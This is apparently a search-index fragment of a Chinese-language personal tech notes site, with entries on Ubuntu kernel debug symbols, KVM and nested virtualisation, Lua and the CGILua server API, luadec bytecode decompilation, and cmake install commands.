\u8c03\u8bd5\u7b26\u53f7\u5305\u542b\u6e90\u4ee3\u7801\u7ea7\u4fe1\u606f\uff0c\u5982\u51fd\u6570\u540d\u3001\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u548c\u4ece\u6e90\u4ee3\u7801\u884c\u53f7\u5230\u6307\u4ee4\u7684\u6620\u5c04\u3002\u5728\u8c03\u8bd5\u6216\u5206\u6790\u5185\u6838\u65f6\uff0c\u8fd9\u4e9b\u4fe1\u606f\u975e\u5e38\u6709\u7528\u3002 \u4e24\u79cd\u65b9\u6cd5\u83b7\u53d6\u8c03\u8bd5\u7b26\u53f7\uff0c\u4e00\u79cd\u662f\u7f16\u8bd1\u65f6\u5e26\u8c03\u8bd5\u7b26\u53f7\u4fe1\u606f\uff0c\u53e6\u4e00\u79cd\u662f\u4e0b\u8f7d\u6e90\u4ee3\u7801\u5e76\u5728\u8c03\u8bd5\u65f6\u9644\u52a0\uff0c\u8fd9\u91cc\u4f7f\u7528\u7b2c\u4e8c\u79cd # GPG key import, For Ubuntu 16.04 and higher # For older distributions:sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ECDCAD72428D7C01 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622 # Add repository config sudo tee /etc/apt/sources.list.d/ddebs.list << EOF deb http://ddebs.ubuntu.com/ ${codename} main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-security main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-updates main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-proposed main restricted universe multiverse EOF # update packages sudo apt-get update # Download and install the debugging synbols codename = $( lsb_release -c | awk '{print $2}' ) sudo apt-get install -y linux-image- $( uname -r ) -dbgsym # Verify file /usr/lib/debug/boot/vmlinux- $( uname -r ) # debug # symbol-file /usr/lib/debug/boot/vmlinux-$(uname -r) in gdb Download kernel source code \u00b6 # Firstly, enable deb-src in /etc/apt/source.list sudo apt-get update apt source linux # \u4e0b\u8f7d\u7684\u6e90\u7801\u4e0d\u5b8c\u5168\u4e0e\u5f53\u524d\u7cfb\u7edf\u7248\u672c\u5bf9\u5e94 \u5c1d\u8bd5 git clone git://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/ $( lsb_release -cs ) # \u5f88\u6162","title":"kernel-debug"},{"location":"module/kernel/kernel-debug/#debug-kernel","text":"","title":"debug kernel"},{"location":"module/kernel/kernel-debug/#debug-ubuntu-kernel","text":"","title":"debug ubuntu kernel"},{"location":"module/kernel/kernel-debug/#download-kernel-debug-symbol","text":"\u8c03\u8bd5\u7b26\u53f7\u5305\u542b\u6e90\u4ee3\u7801\u7ea7\u4fe1\u606f\uff0c\u5982\u51fd\u6570\u540d\u3001\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u548c\u4ece\u6e90\u4ee3\u7801\u884c\u53f7\u5230\u6307\u4ee4\u7684\u6620\u5c04\u3002\u5728\u8c03\u8bd5\u6216\u5206\u6790\u5185\u6838\u65f6\uff0c\u8fd9\u4e9b\u4fe1\u606f\u975e\u5e38\u6709\u7528\u3002 \u4e24\u79cd\u65b9\u6cd5\u83b7\u53d6\u8c03\u8bd5\u7b26\u53f7\uff0c\u4e00\u79cd\u662f\u7f16\u8bd1\u65f6\u5e26\u8c03\u8bd5\u7b26\u53f7\u4fe1\u606f\uff0c\u53e6\u4e00\u79cd\u662f\u4e0b\u8f7d\u6e90\u4ee3\u7801\u5e76\u5728\u8c03\u8bd5\u65f6\u9644\u52a0\uff0c\u8fd9\u91cc\u4f7f\u7528\u7b2c\u4e8c\u79cd # GPG key import, For Ubuntu 16.04 and higher # For older distributions:sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ECDCAD72428D7C01 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622 # Add repository config sudo tee /etc/apt/sources.list.d/ddebs.list << EOF deb http://ddebs.ubuntu.com/ ${codename} main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-security main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-updates main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-proposed main restricted universe multiverse EOF # update packages sudo apt-get update # Download and install the debugging synbols codename = $( lsb_release -c | awk '{print $2}' ) sudo apt-get install -y linux-image- $( uname -r ) -dbgsym # Verify file /usr/lib/debug/boot/vmlinux- $( uname -r ) # debug # symbol-file /usr/lib/debug/boot/vmlinux-$(uname -r) in gdb","title":"Download kernel debug symbol"},{"location":"module/kernel/kernel-debug/#download-kernel-source-code","text":"# Firstly, enable deb-src in /etc/apt/source.list sudo apt-get update apt source linux # \u4e0b\u8f7d\u7684\u6e90\u7801\u4e0d\u5b8c\u5168\u4e0e\u5f53\u524d\u7cfb\u7edf\u7248\u672c\u5bf9\u5e94 \u5c1d\u8bd5 git clone git://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/ $( lsb_release -cs ) # \u5f88\u6162","title":"Download kernel source code"},{"location":"module/kernel/kernel-header/","text":"kernel header \u00b6 linux/kernel.h \u00b6 kernel.h\u4e2d\u5305\u542b\u4e86\u5185\u6838\u6253\u5370\u51fd\u6570 printk\u51fd\u6570 \u7b49","title":"kernel-header"},{"location":"module/kernel/kernel-header/#kernel-header","text":"","title":"kernel header"},{"location":"module/kernel/kernel-header/#linuxkernelh","text":"kernel.h\u4e2d\u5305\u542b\u4e86\u5185\u6838\u6253\u5370\u51fd\u6570 printk\u51fd\u6570 \u7b49","title":"linux/kernel.h"},{"location":"module/kernel/kernel-hook/","text":"kernel hook \u00b6 makefile obj- \u00b6 obj-$(CONFIG_FOO) += foo.o $(CONFIG_FOO)\u53ef\u4ee5\u4e3ay(\u7f16\u8bd1\u8fdb\u5185\u6838) \u6216m(\u7f16\u8bd1\u6210\u6a21\u5757)\u3002\u5982\u679cCONFIG_FOO\u4e0d\u662fy \u548cm,\u90a3\u4e48\u8be5\u6587\u4ef6\u5c31\u4e0d\u4f1a\u88ab\u7f16\u8bd1\u8054\u63a5\u4e86","title":"kernel-hook"},{"location":"module/kernel/kernel-hook/#kernel-hook","text":"","title":"kernel hook"},{"location":"module/kernel/kernel-hook/#makefile-obj-","text":"obj-$(CONFIG_FOO) += foo.o $(CONFIG_FOO)\u53ef\u4ee5\u4e3ay(\u7f16\u8bd1\u8fdb\u5185\u6838) \u6216m(\u7f16\u8bd1\u6210\u6a21\u5757)\u3002\u5982\u679cCONFIG_FOO\u4e0d\u662fy \u548cm,\u90a3\u4e48\u8be5\u6587\u4ef6\u5c31\u4e0d\u4f1a\u88ab\u7f16\u8bd1\u8054\u63a5\u4e86","title":"makefile obj-"},{"location":"module/kernel/kernel-kvm/","text":"kvm \u00b6 kvm\u652f\u6301 \u00b6 \u786c\u4ef6 \u00b6 Intel\u5904\u7406\u5668\u662fVT-x\uff0cAMD\u5904\u7406\u5668\u662fAMD-V lscpu | grep Virtualization # Virtualization: VT-x # Virtualization type: full \u5185\u6838\u652f\u6301 \u00b6 kvm\u548c(kvm_intel|kvm_amd) lsmod | grep kvm # kvm_intel 204800 0 # kvm 593920 1 kvm_intel # irqbypass 16384 1 kvm virtio \u00b6 virtio\u5185\u6838\u652f\u6301 \u00b6 \u4e3a\u5ba2\u6237\u673a\u63d0\u4f9b\u4e86\u4e00\u79cd\u4f7f\u7528\u4e3b\u673a\u4e0a\u8bbe\u5907\u7684\u5feb\u901f\u6709\u6548\u7684\u901a\u4fe1\u65b9\u5f0f\u3002KVM\u4f7f\u7528Virtio API\u4f5c\u4e3a\u865a\u62df\u673a\u7ba1\u7406\u7a0b\u5e8f\u548c\u5ba2\u6237\u673a\u4e4b\u95f4\u7684\u8fde\u63a5\u5c42\uff0c\u4e3a\u865a\u62df\u673a\u63d0\u4f9b\u51c6\u865a\u62df\u5316\u8bbe\u5907\uff08\u4ea6\u79f0Virtio\u8bbe\u5907\uff09\u3002\u6240\u6709Virtio\u8bbe\u5907\u90fd\u5305\u62ec\u4e24\u90e8\u5206\uff1a\u4e3b\u673a\u8bbe\u5907\u548c\u5ba2\u6237\u673a\u9a71\u52a8\u7a0b\u5e8f\u3002 lsmod | grep virtio # \u5982\u4f55\u52a0\u8f7d\u5185\u6838\u6a21\u5757 # modprobe module_name \u6216\u8005 insmod filename [args] # \u5982\u4f55\u5378\u8f7d\u5185\u6838\u6a21\u5757 # modprobe -r module_name \u6216\u8005 rmmod module_name # \u652f\u6301\u7684\u8bbe\u5907\u5217\u8868 # \u7f51\u7edc\u8bbe\u5907 (virtio-net) # \u786c\u76d8\u8bbe\u5907 (virtio-blk) # \u63a7\u5236\u5668\u8bbe\u5907 (virtio-scsi) # \u4e32\u53e3\u8bbe\u5907 (virtio-serial) # balloon\u8bbe\u5907 (virtio-balloon) \u5d4c\u5957\u865a\u62df\u5316 \u00b6 \u542f\u7528 \u00b6 \u4e34\u65f6 modprobe -r kvm_intel modprobe kvm_intel nested = 1 \u6301\u4e45 cat >> /etc/modprobe.d/modprobe.conf <<EOF options kvm_intel nested=1 EOF \u67e5\u770b cat /sys/module/kvm_intel/parameters/nested # or systool -m kvm_intel -v | grep nested","title":"kernel-kvm"},{"location":"module/kernel/kernel-kvm/#kvm","text":"","title":"kvm"},{"location":"module/kernel/kernel-kvm/#kvm_1","text":"","title":"kvm\u652f\u6301"},{"location":"module/kernel/kernel-kvm/#_1","text":"Intel\u5904\u7406\u5668\u662fVT-x\uff0cAMD\u5904\u7406\u5668\u662fAMD-V lscpu | grep Virtualization # Virtualization: VT-x # Virtualization type: full","title":"\u786c\u4ef6"},{"location":"module/kernel/kernel-kvm/#_2","text":"kvm\u548c(kvm_intel|kvm_amd) lsmod | grep kvm # kvm_intel 204800 0 # kvm 593920 1 kvm_intel # irqbypass 16384 1 kvm","title":"\u5185\u6838\u652f\u6301"},{"location":"module/kernel/kernel-kvm/#virtio","text":"","title":"virtio"},{"location":"module/kernel/kernel-kvm/#virtio_1","text":"\u4e3a\u5ba2\u6237\u673a\u63d0\u4f9b\u4e86\u4e00\u79cd\u4f7f\u7528\u4e3b\u673a\u4e0a\u8bbe\u5907\u7684\u5feb\u901f\u6709\u6548\u7684\u901a\u4fe1\u65b9\u5f0f\u3002KVM\u4f7f\u7528Virtio API\u4f5c\u4e3a\u865a\u62df\u673a\u7ba1\u7406\u7a0b\u5e8f\u548c\u5ba2\u6237\u673a\u4e4b\u95f4\u7684\u8fde\u63a5\u5c42\uff0c\u4e3a\u865a\u62df\u673a\u63d0\u4f9b\u51c6\u865a\u62df\u5316\u8bbe\u5907\uff08\u4ea6\u79f0Virtio\u8bbe\u5907\uff09\u3002\u6240\u6709Virtio\u8bbe\u5907\u90fd\u5305\u62ec\u4e24\u90e8\u5206\uff1a\u4e3b\u673a\u8bbe\u5907\u548c\u5ba2\u6237\u673a\u9a71\u52a8\u7a0b\u5e8f\u3002 lsmod | grep virtio # \u5982\u4f55\u52a0\u8f7d\u5185\u6838\u6a21\u5757 # modprobe module_name \u6216\u8005 insmod filename [args] # \u5982\u4f55\u5378\u8f7d\u5185\u6838\u6a21\u5757 # modprobe -r module_name \u6216\u8005 rmmod module_name # \u652f\u6301\u7684\u8bbe\u5907\u5217\u8868 # \u7f51\u7edc\u8bbe\u5907 (virtio-net) # \u786c\u76d8\u8bbe\u5907 (virtio-blk) # \u63a7\u5236\u5668\u8bbe\u5907 (virtio-scsi) # \u4e32\u53e3\u8bbe\u5907 (virtio-serial) # balloon\u8bbe\u5907 (virtio-balloon)","title":"virtio\u5185\u6838\u652f\u6301"},{"location":"module/kernel/kernel-kvm/#_3","text":"","title":"\u5d4c\u5957\u865a\u62df\u5316"},{"location":"module/kernel/kernel-kvm/#_4","text":"\u4e34\u65f6 modprobe -r kvm_intel modprobe kvm_intel nested = 1 \u6301\u4e45 cat >> /etc/modprobe.d/modprobe.conf <<EOF options kvm_intel nested=1 EOF \u67e5\u770b cat /sys/module/kvm_intel/parameters/nested # or systool -m kvm_intel -v | grep nested","title":"\u542f\u7528"},{"location":"module/llvm/pass/","text":"","title":"pass"},{"location":"module/lua/lua/","text":"lua \u00b6 syntax \u00b6 require(\"<\u6a21\u5757\u540d>\") require( \"<\u6a21\u5757\u540d>\" ) -- \u7528\u6765\u52a0\u8f7d\u6a21\u5757 local v = require( \"<\u6a21\u5757\u540d>\" ) -- \u53ef\u4ee5\u7ed9\u52a0\u8f7d\u7684\u6a21\u5757\u5b9a\u4e49\u4e00\u4e2a\u522b\u540d\u53d8\u91cf -- Lua\u542f\u52a8\u65f6\uff0c\u4f1a\u4ee5\u73af\u5883\u53d8\u91cf LUA_PATH \u7684\u503c\u6765\u521d\u59cb\u5168\u5c40\u53d8\u91cf package.path\uff0c\u7528\u4e8erequire\u641c\u7d22 Lua \u6587\u4ef6 -- \u52a0\u8f7dC local path = \"/usr/local/lua/lib/libluasocket.so\" -- \u6216\u8005 path = \"C:\\\\windows\\\\luasocket.dll\"\uff0c\u8fd9\u662f Window \u5e73\u53f0\u4e0b local f = assert(loadlib(path, \"luaopen_socket\" )) f() -- \u771f\u6b63\u6253\u5f00\u5e93 cgilua \u00b6 installing cgilua \u00b6 luarocks install cgilua # Lua\u5305\u7ba1\u7406\u5de5\u5177Luarocks api \u00b6 Server API \u00b6 Server API (SAPI)\u5141\u8bb8\u62bd\u8c61\u4e00\u7cfb\u5217\u5185\u90e8web\u670d\u52a1\u5668\u7ec6\u8282\uff0c\u5e76\u5141\u8bb8\u5728WSAPI\u4e0a\u4f7f\u7528CGILua\u3002 Kepler\u662fWSAPI\u7684\u53c2\u8003\u5b9e\u73b0\uff0c\u76ee\u524d\u652f\u6301Apache\u3001Microsoft IIS\u548cXavante\u4f5c\u4e3aWeb\u670d\u52a1\u5668\uff0c\u652f\u6301CGI\u3001FastCGI\u4f5c\u4e3aWSAPI\u8fde\u63a5\u5668\u3002 SAPI.Request SAPI.Request.getpostdata ([n]) \u83b7\u53d6\u4e00\u5757 post\u6570\u636e. \u53ef\u9009\u53c2\u6570 n\u6307\u5b9an\u5b57\u8282\u7684\u8bfb\u5165\u6570\u636e ( \u65e0\u53c2\u6570\u5219\u4f7f\u7528\u9ed8\u8ba4\u5757\u5927\u5c0f ). \u4ee5 lua String\u7684\u5f62\u5f0f\u8fd4\u56de\u8fd9\u5757post\u6570\u636e SAPI.Request.servervariable (varname) \u83b7\u53d6\u670d\u52a1\u5668\u73af\u5883\u53d8\u91cf\u7684\u503c . \u53c2\u6570 varname\u53ef\u4ee5\u662f\u5b9a\u4e49\u7684CGI\u53d8\u91cf\u4e4b\u4e00 \uff0c\u5c3d\u7ba1\u4e0d\u662f\u6240\u6709\u670d\u52a1\u5668\u90fd\u5b9e\u73b0\u4e86\u5168\u90e8\u7684\u53d8\u91cf\u96c6\u3002\u8fd9\u96c6\u5408\u5305\u62ec : AUTH_TYPE - I\u5982\u679c\u670d\u52a1\u5668\u652f\u6301\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1 \uff0c\u5e76\u4e14\u811a\u672c\u53d7\u5230\u4fdd\u62a4 , \u8fd9\u5c31\u662f\u7528\u4e8e\u9a8c\u8bc1\u7528\u6237\u7684\u7279\u5b9a\u534f\u8bae\u9a8c\u8bc1\u65b9\u6cd5 . CONTENT_LENGTH - \u5ba2\u6237\u7aef\u63d0\u4f9b\u7684 content\u81ea\u8eab\u7684\u957f\u5ea6. CONTENT_TYPE - \u5bf9\u4e8e\u9644\u52a0\u4fe1\u606f\u7684\u67e5\u8be2\uff0c\u5982 HTTP POST\u548cPUT \uff0c\u8fd9\u662f\u6570\u636e\u7684 content\u7c7b\u578b \u3002 GATEWAY_INTERFACE - \u6b64\u670d\u52a1\u5668\u9075\u5b88\u7684 CGI\u89c4\u8303\u7684\u4fee\u8ba2. \u683c\u5f0f : CGI / revision PATH_INFO - client\u63d0\u4f9b\u7684\u989d\u5916\u8def\u5f84\u4fe1\u606f. \u6362\u53e5\u8bdd\u8bf4\uff0c\u811a\u672c\u53ef\u4ee5\u901a\u8fc7\u5b83\u4eec\u7684\u865a\u62df\u8def\u5f84\u540d\u8bbf\u95ee\uff0c\u5728\u8def\u5f84\u7684\u672b\u5c3e\u52a0\u4e0a\u989d\u5916\u7684\u4fe1\u606f\u3002 \u989d\u5916\u4fe1\u606f\u4f5c\u4e3a PATH_INFO\u53d1\u9001. \u5982\u679c\u4fe1\u606f\u6765\u81ea URL \uff0c\u5b83\u5c06\u5728\u4f20\u9012\u7ed9 CGI\u811a\u672c\u65f6 \uff0c\u88ab\u670d\u52a1\u5668\u89e3\u7801 PATH_TRANSLATED - \u670d\u52a1\u5668\u63d0\u4f9b\u4e86 PATH_INFO\u7684\u7ffb\u8bd1\u7248\u672c, \u5305\u542b virtual - to - physical\u7684\u6620\u5c04 QUERY_STRING - \u5f15\u7528\u6b64\u811a\u672c\u7684 URL\u4e2d\u7684 \u201c?\u201d\u540e\u9762\u7684\u4fe1\u606f . \u5b83\u4e0d\u5e94\u8be5\u88ab\u89e3\u7801\uff0c\u4e0d\u7ba1\u4ec0\u4e48\u65b9\u5f0f . \u5f53\u6709\u67e5\u8be2\u4fe1\u606f\u65f6\uff0c\u65e0\u8bba\u547d\u4ee4\u884c\u89e3\u7801\u4e0e\u5426\uff0c\u90fd\u5e94\u8be5\u8bbe\u7f6e\u6b64\u53d8\u91cf\u3002 REMOTE_ADDR - \u53d1\u8d77\u8bf7\u6c42\u7684\u8fdc\u7a0b\u4e3b\u673a\u5730\u5740 . REMOTE_HOST - The hostname making the request. If the server does not have this information, it should set REMOTE_ADDR and leave this unset. REMOTE_IDENT - If the HTTP server supports RFC 931 identification, then this variable will be set to the remote user name retrieved from the server. Usage of this variable should be limited to logging only. REMOTE_USER - If the server supports user authentication, and the script is protected, this is the username they have authenticated as. REQUEST_METHOD - \u8bf7\u6c42\u65b9\u6cd5 . For HTTP, this is \"GET\" , \"HEAD\" , \"POST\" , etc. SCRIPT_NAME - A virtual path to the script being executed, used for self - referencing URLs. SERVER_NAME - The server 's hostname, DNS alias, or IP address as it would appear in self-referencing URLs. SERVER_PORT - The port number to which the request was sent. SERVER_PROTOCOL - The name and revision of the information protcol this request came in with. Format: protocol/revision SERVER_SOFTWARE - The name and version of the web server software answering the request (and running the gateway). Format: name/version SAPI.Response SAPI.Response.contenttype (header) Sends the Content - type header to the client. The given header should be in the form \"type/subtype\" . \u5728\u4f7f\u7528 SAPI.Response.write\u53d1\u9001\u4efb\u4f55\u8f93\u51fa\u4e4b\u524d \uff0c\u5fc5\u987b\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002 Returns nothing. SAPI.Response.errorlog (message) Generates error output using the given string or number. Returns nothing. SAPI.Response.header (header, value) Sends a generic header to the client. The first argument must be the header name, such as \"Set-Cookie\" . The second argument should be its value. \u8fd9\u4e2a\u51fd\u6570\u4e0d\u5e94\u8be5\u7528\u6765\u4ee3\u66ff SAPI.Response.contenttype \u6216\u8005 the SAPI.Response.redirect. Returns nothing. SAPI.Response.redirect (url) Sends the Location header to the client. The given url should be a string. Returns nothing. SAPI.Response.write (...) Generates output using the given arguments. The arguments must be strings or numbers. Returns nothing. luadec \u00b6 installing luadec \u00b6 git clone https://github.com/viruscamp/luadec cd luadec git submodule update --init lua-5.1 cd lua-5.1 make linux cd ../luadec make LUAVER = 5 .1 luadec usage \u00b6 # decompile lua binary file: luadec abc.luac #decompile lua source file for testing and comparing: luadec abc.lua # disassemble lua source or binary luadec -dis abc.lua # -pn print nested functions structure, could be used by -fn luadec -pn test.lua # -f decompile only specific nested function luadec -f 0_1 test.lua # -ns donot process sub functions luadec -ns -f 0_1 test.lua # -fc perform a instruction-by-instruction compare for each function luadec -fc test.lua issue 1 \u00b6 $ ./luadec/luadec -pn workspace/lua.luac ./luadec/luadec: workspace/lua.luac: bad header in precompiled chunk solution 1 # http://sourceforge.net/projects/unluac/?source=directory java -jar unluac_2015_06_13.jar workspace/lua.luac > myfile_decompiled.lua","title":"lua"},{"location":"module/lua/lua/#lua","text":"","title":"lua"},{"location":"module/lua/lua/#syntax","text":"require(\"<\u6a21\u5757\u540d>\") require( \"<\u6a21\u5757\u540d>\" ) -- \u7528\u6765\u52a0\u8f7d\u6a21\u5757 local v = require( \"<\u6a21\u5757\u540d>\" ) -- \u53ef\u4ee5\u7ed9\u52a0\u8f7d\u7684\u6a21\u5757\u5b9a\u4e49\u4e00\u4e2a\u522b\u540d\u53d8\u91cf -- Lua\u542f\u52a8\u65f6\uff0c\u4f1a\u4ee5\u73af\u5883\u53d8\u91cf LUA_PATH \u7684\u503c\u6765\u521d\u59cb\u5168\u5c40\u53d8\u91cf package.path\uff0c\u7528\u4e8erequire\u641c\u7d22 Lua \u6587\u4ef6 -- \u52a0\u8f7dC local path = \"/usr/local/lua/lib/libluasocket.so\" -- \u6216\u8005 path = \"C:\\\\windows\\\\luasocket.dll\"\uff0c\u8fd9\u662f Window \u5e73\u53f0\u4e0b local f = assert(loadlib(path, \"luaopen_socket\" )) f() -- \u771f\u6b63\u6253\u5f00\u5e93","title":"syntax"},{"location":"module/lua/lua/#cgilua","text":"","title":"cgilua"},{"location":"module/lua/lua/#installing-cgilua","text":"luarocks install cgilua # Lua\u5305\u7ba1\u7406\u5de5\u5177Luarocks","title":"installing cgilua"},{"location":"module/lua/lua/#api","text":"","title":"api"},{"location":"module/lua/lua/#server-api","text":"Server API (SAPI)\u5141\u8bb8\u62bd\u8c61\u4e00\u7cfb\u5217\u5185\u90e8web\u670d\u52a1\u5668\u7ec6\u8282\uff0c\u5e76\u5141\u8bb8\u5728WSAPI\u4e0a\u4f7f\u7528CGILua\u3002 Kepler\u662fWSAPI\u7684\u53c2\u8003\u5b9e\u73b0\uff0c\u76ee\u524d\u652f\u6301Apache\u3001Microsoft IIS\u548cXavante\u4f5c\u4e3aWeb\u670d\u52a1\u5668\uff0c\u652f\u6301CGI\u3001FastCGI\u4f5c\u4e3aWSAPI\u8fde\u63a5\u5668\u3002 SAPI.Request SAPI.Request.getpostdata ([n]) \u83b7\u53d6\u4e00\u5757 post\u6570\u636e. \u53ef\u9009\u53c2\u6570 n\u6307\u5b9an\u5b57\u8282\u7684\u8bfb\u5165\u6570\u636e ( \u65e0\u53c2\u6570\u5219\u4f7f\u7528\u9ed8\u8ba4\u5757\u5927\u5c0f ). \u4ee5 lua String\u7684\u5f62\u5f0f\u8fd4\u56de\u8fd9\u5757post\u6570\u636e SAPI.Request.servervariable (varname) \u83b7\u53d6\u670d\u52a1\u5668\u73af\u5883\u53d8\u91cf\u7684\u503c . \u53c2\u6570 varname\u53ef\u4ee5\u662f\u5b9a\u4e49\u7684CGI\u53d8\u91cf\u4e4b\u4e00 \uff0c\u5c3d\u7ba1\u4e0d\u662f\u6240\u6709\u670d\u52a1\u5668\u90fd\u5b9e\u73b0\u4e86\u5168\u90e8\u7684\u53d8\u91cf\u96c6\u3002\u8fd9\u96c6\u5408\u5305\u62ec : AUTH_TYPE - I\u5982\u679c\u670d\u52a1\u5668\u652f\u6301\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1 \uff0c\u5e76\u4e14\u811a\u672c\u53d7\u5230\u4fdd\u62a4 , \u8fd9\u5c31\u662f\u7528\u4e8e\u9a8c\u8bc1\u7528\u6237\u7684\u7279\u5b9a\u534f\u8bae\u9a8c\u8bc1\u65b9\u6cd5 . CONTENT_LENGTH - \u5ba2\u6237\u7aef\u63d0\u4f9b\u7684 content\u81ea\u8eab\u7684\u957f\u5ea6. CONTENT_TYPE - \u5bf9\u4e8e\u9644\u52a0\u4fe1\u606f\u7684\u67e5\u8be2\uff0c\u5982 HTTP POST\u548cPUT \uff0c\u8fd9\u662f\u6570\u636e\u7684 content\u7c7b\u578b \u3002 GATEWAY_INTERFACE - \u6b64\u670d\u52a1\u5668\u9075\u5b88\u7684 CGI\u89c4\u8303\u7684\u4fee\u8ba2. \u683c\u5f0f : CGI / revision PATH_INFO - client\u63d0\u4f9b\u7684\u989d\u5916\u8def\u5f84\u4fe1\u606f. \u6362\u53e5\u8bdd\u8bf4\uff0c\u811a\u672c\u53ef\u4ee5\u901a\u8fc7\u5b83\u4eec\u7684\u865a\u62df\u8def\u5f84\u540d\u8bbf\u95ee\uff0c\u5728\u8def\u5f84\u7684\u672b\u5c3e\u52a0\u4e0a\u989d\u5916\u7684\u4fe1\u606f\u3002 \u989d\u5916\u4fe1\u606f\u4f5c\u4e3a PATH_INFO\u53d1\u9001. \u5982\u679c\u4fe1\u606f\u6765\u81ea URL \uff0c\u5b83\u5c06\u5728\u4f20\u9012\u7ed9 CGI\u811a\u672c\u65f6 \uff0c\u88ab\u670d\u52a1\u5668\u89e3\u7801 PATH_TRANSLATED - \u670d\u52a1\u5668\u63d0\u4f9b\u4e86 PATH_INFO\u7684\u7ffb\u8bd1\u7248\u672c, \u5305\u542b virtual - to - physical\u7684\u6620\u5c04 QUERY_STRING - \u5f15\u7528\u6b64\u811a\u672c\u7684 URL\u4e2d\u7684 \u201c?\u201d\u540e\u9762\u7684\u4fe1\u606f . \u5b83\u4e0d\u5e94\u8be5\u88ab\u89e3\u7801\uff0c\u4e0d\u7ba1\u4ec0\u4e48\u65b9\u5f0f . \u5f53\u6709\u67e5\u8be2\u4fe1\u606f\u65f6\uff0c\u65e0\u8bba\u547d\u4ee4\u884c\u89e3\u7801\u4e0e\u5426\uff0c\u90fd\u5e94\u8be5\u8bbe\u7f6e\u6b64\u53d8\u91cf\u3002 REMOTE_ADDR - \u53d1\u8d77\u8bf7\u6c42\u7684\u8fdc\u7a0b\u4e3b\u673a\u5730\u5740 . REMOTE_HOST - The hostname making the request. If the server does not have this information, it should set REMOTE_ADDR and leave this unset. REMOTE_IDENT - If the HTTP server supports RFC 931 identification, then this variable will be set to the remote user name retrieved from the server. Usage of this variable should be limited to logging only. REMOTE_USER - If the server supports user authentication, and the script is protected, this is the username they have authenticated as. REQUEST_METHOD - \u8bf7\u6c42\u65b9\u6cd5 . For HTTP, this is \"GET\" , \"HEAD\" , \"POST\" , etc. SCRIPT_NAME - A virtual path to the script being executed, used for self - referencing URLs. SERVER_NAME - The server 's hostname, DNS alias, or IP address as it would appear in self-referencing URLs. SERVER_PORT - The port number to which the request was sent. SERVER_PROTOCOL - The name and revision of the information protcol this request came in with. Format: protocol/revision SERVER_SOFTWARE - The name and version of the web server software answering the request (and running the gateway). Format: name/version SAPI.Response SAPI.Response.contenttype (header) Sends the Content - type header to the client. The given header should be in the form \"type/subtype\" . \u5728\u4f7f\u7528 SAPI.Response.write\u53d1\u9001\u4efb\u4f55\u8f93\u51fa\u4e4b\u524d \uff0c\u5fc5\u987b\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002 Returns nothing. SAPI.Response.errorlog (message) Generates error output using the given string or number. Returns nothing. SAPI.Response.header (header, value) Sends a generic header to the client. The first argument must be the header name, such as \"Set-Cookie\" . The second argument should be its value. \u8fd9\u4e2a\u51fd\u6570\u4e0d\u5e94\u8be5\u7528\u6765\u4ee3\u66ff SAPI.Response.contenttype \u6216\u8005 the SAPI.Response.redirect. Returns nothing. SAPI.Response.redirect (url) Sends the Location header to the client. The given url should be a string. Returns nothing. SAPI.Response.write (...) Generates output using the given arguments. The arguments must be strings or numbers. Returns nothing.","title":"Server API"},{"location":"module/lua/lua/#luadec","text":"","title":"luadec"},{"location":"module/lua/lua/#installing-luadec","text":"git clone https://github.com/viruscamp/luadec cd luadec git submodule update --init lua-5.1 cd lua-5.1 make linux cd ../luadec make LUAVER = 5 .1","title":"installing luadec"},{"location":"module/lua/lua/#luadec-usage","text":"# decompile lua binary file: luadec abc.luac #decompile lua source file for testing and comparing: luadec abc.lua # disassemble lua source or binary luadec -dis abc.lua # -pn print nested functions structure, could be used by -fn luadec -pn test.lua # -f decompile only specific nested function luadec -f 0_1 test.lua # -ns donot process sub functions luadec -ns -f 0_1 test.lua # -fc perform a instruction-by-instruction compare for each function luadec -fc test.lua","title":"luadec usage"},{"location":"module/lua/lua/#issue-1","text":"$ ./luadec/luadec -pn workspace/lua.luac ./luadec/luadec: workspace/lua.luac: bad header in precompiled chunk solution 1 # http://sourceforge.net/projects/unluac/?source=directory java -jar unluac_2015_06_13.jar workspace/lua.luac > myfile_decompiled.lua","title":"issue 1"},{"location":"module/makefile/cmake/","text":"cmake \u00b6 cmake \u8bed\u6cd5 install \u6307\u4ee4\uff08\u4e3b\u8981\u662f\u751f\u6210Makefile\u4e2d\u7684install target\uff09 \u00b6 install( FILES flie DESTINATION dir_path ) #\u6267\u884cmake install\u65f6\uff0c\u628afile\u62f7\u8d1d\u5230dir_path install( PROGRAMS file DESTINATION dir_path ) #\u6267\u884cmake install\u65f6\uff0c\u628afile\u62f7\u8d1d\u5230dir_path,\u5e76\u7ed9\u4e88file\u53ef\u6267\u884c\u6743\u9650 INSTALL( TARGETS ylib ylib_s #RUNTIME DESTINATION xxx LIBRARY DESTINATION lib ARCHIVE DESTINATION lib ) # \u5b89\u88c5libylib.so\u5230lib\u76ee\u5f55\uff0c\u5b89\u88c5libylib_s.a\u5230lib\u76ee\u5f55\uff0cRUNTIME \u662f\u5b89\u88c5\u53ef\u6267\u884c\u6587\u4ef6\u5230xxx\u76ee\u5f55\uff0c\u6ce8\u610f\u8fd9\u4e2a\u6307\u4ee4\u6709\u4e2a\u5751\uff0c\u6211\u540e\u9762\u4f1a\u8bf4\u660e\u8fd9\u4e2a configure_file \u00b6 configure_file( fileA fileB @ONLY ) #\u628afileA \u590d\u5236\u5e76\u91cd\u547d\u540d\u4e3afileB,\u6b64\u65f6\uff0cfileA\u4e2d\u7684@var@\u7684\u503c\u4f1a\u88ab\u66ff\u6362\u4e3acmakelists.txt 